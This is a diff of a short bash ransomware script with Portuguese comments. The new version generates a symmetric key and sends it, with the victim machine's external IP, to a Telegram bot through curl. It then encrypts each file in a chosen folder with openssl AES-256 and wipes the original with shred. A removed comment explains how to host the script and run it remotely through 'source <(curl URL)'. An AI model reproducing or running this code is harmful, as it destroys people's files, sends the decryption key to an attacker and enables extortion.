@@ -1,12 +1,13 @@
 #!/bin/bash
-echo $(/usr/bin/dbus-uuidgen) > simetric.key
-for file in /root/*
+# Salva na variável SIMETRIC a chave a ser utilizada
+simetric=$(/usr/bin/dbus-uuidgen)
+# Envia a chave e o IP externo da máquina para o telegram
+curl -s -o /dev/null "https://api.telegram.org/bot<YoutBOTToken>/sendMessage?chat_id=<channel_id>&text=$(dig @resolver4.opendns.com myip.opendns.com +short) - $simetric"
+# Loop dentro da pasta a ser criptografada
+for file in <folder to be encrypted>
 do
-if [ "$file" != "ransomware.sh" ] && [ "$file" != "simetric.key" ];
-then
-openssl enc -aes256 -k $(<simetric.key) -a -e -in $file -out $file".enc"
+# Criptografa os arquivos utilizando a chave
+openssl enc -aes256 -k $simetric -a -e -in $file -out $file".enc"
+# Remove o aquivo original
 shred -fz $file
-fi
 done
-# Se criar uma chave e mantiver ela online e esse script também, então dá pra remover o if e executar esse script com o comando "source <(curl URL),
-# fazendo a substituição devida da chave de criptografia no comando openssl para a chave online (pode estar também em arquivo).
